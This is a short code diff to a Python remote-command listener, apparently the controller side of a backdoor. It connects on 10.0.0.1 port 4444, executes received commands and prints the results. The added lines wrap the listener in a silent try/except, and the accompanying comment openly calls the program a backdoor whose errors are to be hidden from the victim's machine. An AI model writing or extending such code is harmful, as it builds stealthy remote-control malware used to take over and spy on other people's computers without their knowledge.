@@ -76,8 +76,11 @@ class Listener:
             except Exception:
                 result = "Error during command execution."
             print(result)
-
-my_listener = Listener("10.0.0.1", 4444)
-my_listener.run()
+try:
+    # This prevents sending error messages to the user machine when we are not in the listening mode but backdoor is otherwise working.
+    my_listener = Listener("10.0.0.1", 4444)
+    my_listener.run()
+except Exception:
+    sys.exit()
 
 
